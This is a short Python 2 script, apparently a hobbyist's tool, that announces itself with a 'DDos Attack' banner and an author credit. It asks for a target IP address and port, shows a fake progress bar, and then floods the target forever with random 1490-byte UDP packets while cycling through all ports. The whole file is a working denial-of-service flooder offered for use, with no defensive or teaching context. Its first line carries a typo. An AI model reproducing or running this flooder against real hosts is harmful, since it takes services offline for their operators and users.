iwmport sys

import os

import time

import socket

import random

#Code Time

from datetime import datetime

now = datetime.now()

hour = now.hour

minute = now.minute

day = now.day

month = now.month

year = now.year



##############

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

#############



os.system("clear")

os.system("figlet DDos Attack")

print

print "Author    : Mr_DDOS"
print "github    : https://github.com/danielerik12"
print "Facebook  : TIDAK ADA GAYS"
print "WhatsAap  : 087702690550"
print "instagram : TIDAK ADA GAY"
print

ip = raw_input("IP Target : ")

port = input("Port       : ")

os.system("clear")

os.system("figlet Attack Starting")

print "[                    ] 10% "

time.sleep(5)

print "[=====               ] 25%"

time.sleep(5)

print "[==========          ] 50%"

time.sleep(5)

print "[===============     ] 75%"

time.sleep(5)

print "[====================] 100%"

time.sleep(3)

sent = 0

while True:

     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
      port = 1